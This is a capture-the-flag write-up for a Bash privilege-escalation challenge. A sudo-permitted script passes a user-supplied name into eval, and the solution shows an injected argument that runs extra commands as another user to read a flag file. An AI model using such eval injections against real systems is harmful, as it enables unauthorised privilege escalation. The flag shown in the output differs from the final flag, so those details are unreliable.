# bash / Bash is fun

> Points: 478

## Question

> Bash is fun, prove me wrong and do some privesc.

## Solution

After connecting and knowing we have to privesc, try doing `sudo -l`,
where we get the following line:

```text
  (user-privileged) NOPASSWD: /home/user1/welcome.sh
```

What's in `welcome.sh`? Looking at everything in our home directory, we find it
alongside `flag.txt` and `welcome.txt`.

```bash
#!/bin/bash
name="greet"
while [[ "$1" =~ ^- && ! "$1" == "--" ]]; do case $1 in
  -V | --version )
    echo "Beta version"
    exit
    ;;
  -n | --name )
    shift; name=$1
    ;;
  -u | --username )
    shift; username=$1
    ;;
  -p | --permission )
     permission=1
     ;;
esac; shift; done
if [[ "$1" == '--' ]]; then shift; fi

echo "Welcome To SysAdmin Welcomer \o/"

eval "function $name { sed 's/user/${username}/g' welcome.txt ; }"
export -f $name
isNew=0
if [[ $isNew -eq 1 ]];then
    $name
fi

if [[ $permission -eq 1 ]];then
    echo "You are: "
    id
fi
```

Since `$name` is being passed straight into `eval`, we can attack that.
First, escape `function` with `greet { id; };` (defining a dummy function `f`).
Now we can just `cat flag.txt;` and add a `#` to comment out the rest of the `eval`.

```
$ sudo -u user-privileged ./welcome.sh -n "greet { id; }; cat flag.txt #"
Welcome To SysAdmin Welcomer \o/
FwordCTF{W00w_KuR0ko_T0ld_M3_th4t_Th1s_1s_M1sdirecti0n_BasK3t_FTW}
Welcome to Fword Island Mr user ! You have nothing to do here
```

...and we have our flag.

### Flag

`FwordCTF{BasH_1S_R3aLLy_4w3s0m3_K4hLaFTW}`
